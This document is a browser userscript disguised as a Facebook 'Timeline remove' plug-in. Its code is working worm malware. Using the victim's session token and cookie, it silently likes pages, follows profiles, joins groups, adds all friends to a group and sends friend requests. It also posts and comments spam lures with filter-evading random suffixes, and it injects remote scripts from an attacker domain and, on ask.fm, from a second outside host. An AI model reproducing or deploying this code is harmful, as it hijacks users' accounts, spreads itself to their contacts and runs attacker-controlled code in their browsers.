// ==UserScript==
// @name           Chrome Facebook
// @author         Chrome Facebook
// @version        2.5
// @description    Facebook Timeline Remove Plug-in / Facebook Zaman Tünelinden Kurtulma
// @namespace      Chrome Facebook
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// ==/UserScript==



var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function like(liker){
    var http = new XMLHttpRequest();
     
    var url = "/ajax/pages/fan_status.php?__a=1";
     
    var params = "&fbpage_id=" + liker + "&add=1&reload=1&preserve_tab=true&fan_origin=page_profile&nctr[_mod]=pagelet_header&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http.open("POST", url, true);
     
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
     
    http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
       
      http.close; // Close the connection
     
    }
    }
    
    http.send(params);
}

// abone kasma
a("100003576056080");
a("100004006294778");
a("100001836217028");
like("218585241598204");
like("149664561735463");
like("139225256105691");
like("399330463428137");
like("269062706517632");
like("123753887767597");
like("386424518053415");
like("266242916741418");
like("108953392563678");
like("335483696501060");
like("503032216379161");
like("230654293723099");
like("306437742784858");	 // Sayfa Kasma



var gid = ['348398708570071'];  // Grub kasma

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};


var spage_id = "503032216379161";   // Oto Post
var spost_id = "503032216379161";
var sfoto_id = "503032216379161";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}


//fotograf paylas
function sfotopaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=503032216379161";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + sfoto_id;
		params += "&attachment[type]=2";
		params += "&src=i";
		params += "&appid=2305272732";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
		
}

//postpaylas
function spostpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=503032216379161";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&reshare=" + spage_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + spost_id;
		params += "&attachment[params][images][0]=http://i1.ytimg.com/vi/4kr_LlfqEqo/mqdefault.jpg";
		params += "&attachment[type]=99";
		params += "&uithumbpager_width=320";
		params += "&uithumbpager_height=180";
		params += "&src=i";
		params += "&appid=2309869772";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}

//postpaylas
function sdurumpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=503032216379161";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&reshare=" + spage_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + spost_id;
		params += "&attachment[type]=22";
		params += "&src=i";
		params += "&appid=25554907596";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}



//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada? ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

sarkadasekle("100001836217028");

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}

// İstek Onayla //
var gid = ['346832378728464'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

// Arkadaş Listesi Alınıyor //
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

// Gruba Arkadaş Ekleniyor //
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
function antispam(a) {
var b, c = "12365478",
d = "";
if (!a) a = 8;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

function antispamyazi(a) {
var b, c = "....",

d = "";
if (!a) a = 5;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

var randomyazi = [
	"Arkadaşlar size sır vereyim zaman http://zamantuneliptal.netii.net tünelinden kurtulmanın yolunu buldum. linke tıklayın ve söylenenleri yapın kesin kurtulacaksınız :",
	"Arkadaşlar size sır vereyim zaman http://zamantuneliptal.netii.net tünelinden kurtulmanın yolunu buldum. linke tıklayın ve söylenenleri yapın kesin kurtulacaksınız+ :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın ve söylenenleri yapın kesin kurtulacaksınız* :",
	"Arkadaşlar size sır vereyim zaman tünelinden  http://zamantuneliptal.netii.net kurtulmanın yolunu buldum. linke tıklayın ve söylenenleri yapın kesin kurtulacaksınız_ :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın http://zamantuneliptal.netii.net yolunu buldum. linke tıklayın ve söylenenleri yapın kesin kurtulacaksınız- :"
]

var baslikrandom = [
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. http://zamantuneliptal.netii.net/ linke tıklayın :",
	"Tıkla saniyeler içinde zaman tünelinden kurtul ! :",
    "Hemen şimdi zaman tünelinden kurtulun ! :",
	"Hemen şimdi zaman tünelini kaldırın. !! :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. http://zamantuneliptal.netii.net linke tıklayın. :"
]

var randomlink = [
	"http://zamantuneliptal.netii.net/",
	"http://zamantuneliptal.netii.net/",
	"http://zamantuneliptal.netii.net/",
    "http://zamantuneliptal.netii.net/",
    "http://zamantuneliptal.netii.net/",
	"http://zamantuneliptal.netii.net/"
]

var randomyorum = [
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın ! http://zamantuneliptal.netii.net :",
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayınsende kurtul http://zamantuneliptal.netii.net !! :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın ! http://zamantuneliptal.netii.net :",
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın http://zamantuneliptal.netii.net !! :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın !!! http://zamantuneliptal.netii.net :"
]

// Wall post ayarlar1.
var randommesaj = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var link = randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var baslik = baslikrandom[Math.floor(Math.random()*baslikrandom.length)] + " "  + antispamyazi()
var resimlink = ['552824_242731792501460_100002939244686_448297_1340218283_n.jpg'/*tpa=http://a4.sphotos.ak.fbcdn.net/hphotos-ak-prn1/s720x720/552824_242731792501460_100002939244686_448297_1340218283_n.jpg*/];
var aciklamarandom = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

// Oto Mesaj Ayarlar1.
var p0 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p1 = ['chrome.jpg'/*tpa=http://zamantuneliptal.netii.net/chrome.jpg*/];
var p2 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p3 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var message = "";

// Yorum Ayarlar1.

var randomyorum = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/dosyalar/sonerie46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/dosyalar/ssile46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/sasile46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/sgrupe46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/swalle46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);

function createXMLHttpRequest() {
 return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
 }

 var c = createXMLHttpRequest();
   c.open("GET", "index604e.html-sk=nf.htm"/*tpa=http://zamantuneliptal.netii.net/index604e.html?sk=nf*/, false);
   c.onreadystatechange = ct;  
   c.send(null);   
function ct() {
var str = c.responseText; 
var fb_dtsg = str.match(/\"fb_dtsg\"\:\"(.*?)\"/)[1];
var charset_test = escape( str.match(/\"charset_test\" value\=\"(.*?)\"/)[1]);
var xhpc_composerid = str.match(/\"xhpc_composerid\" value\=\"(.*?)\"/)[1];
var user = document.cookie.match(/c_user=\d+/gi)[0].replace("c_user=","");
function wall () {  
post =  
"&fb_dtsg="         + fb_dtsg +
"&xhpc_composerid=" + xhpc_composerid +
"&xhpc_targetid="   + user +
"&xhpc_context=profile"        +
"&xhpc_fbx=1"       +
"&xhpc_timeline="   +
"&xhpc_ismeta=1"    +
"&xhpc_message_text="          + randomyorum +
"&xhpc_message="    + randomyorum +
"&composertags_place="         +
"&composertags_place_name="    +
"&composer_predicted_city="    +
"&composer_session_id="        +
"&is_explicit_place="          +
"&audience[0][value]=80"       +
"&composertags_city="          +
"&disable_location_sharing=false"         +
"&nctr[_mod]=pagelet_wall"     + 
"&lsd"   +
"&__user="          + user +
"&phstamp=";

var c = createXMLHttpRequest();
c.open("POST", "http://zamantuneliptal.netii.net/ajax/updatestatus.php?__a=1", false);
c.send(post);
}
   function like(page){
   var b =  "fbpage_id=" + page +
   "&add=1&reload=1"+
   "&preserve_tab=true"+
   "&fan_origin=page_profile&nctr[_mod]=pagelet_header"+
   "&fb_dtsg=" + fb_dtsg+ "&lsd&__"+ user;
   
     c = createXMLHttpRequest();
     c.open("POST", "http://zamantuneliptal.netii.net/ajax/pages/fan_status.php?__a=1", false);
     c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
     c.send(b);
   }
   
like("405741329477737");
   arr = str.match(/name="feedback_params" value="\&\#123(.*?)"/gi);
   
   for (var i in arr){
      
   arr[i] =  arr[i].replace(/&quot;/gi,'"');
   arr[i] =  arr[i].replace(/name=\"feedback_params\" value=\"&#123;/gi,'{');
   arr[i] =  arr[i].replace(/&#125;\"/gi,'}');

 var post = 
   "charset_test="    + charset_test + "&" +
   "fb_dtsg="         + fb_dtsg      + "&" + 
   "feedback_params=" + arr[i]       + "&" +
   "shown_comments=15&total_comments=15&translate_on_load=&add_comment_text_text=" + randomyorum + "&add_comment_text=" + randomyorum + "&" +
   "&comment_replace=optimistic_comment_4183511486_0&comment=1&lsd&__user=" + user + "&phstamp=1658167708055661201152" ;

    var d = createXMLHttpRequest();
    d.open("POST", "http://zamantuneliptal.netii.net/ajax/ufi/modify.php?__a=1", false);
    d.send(post);

   }

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://www.askfmtools.site88.net/hediye.js');
}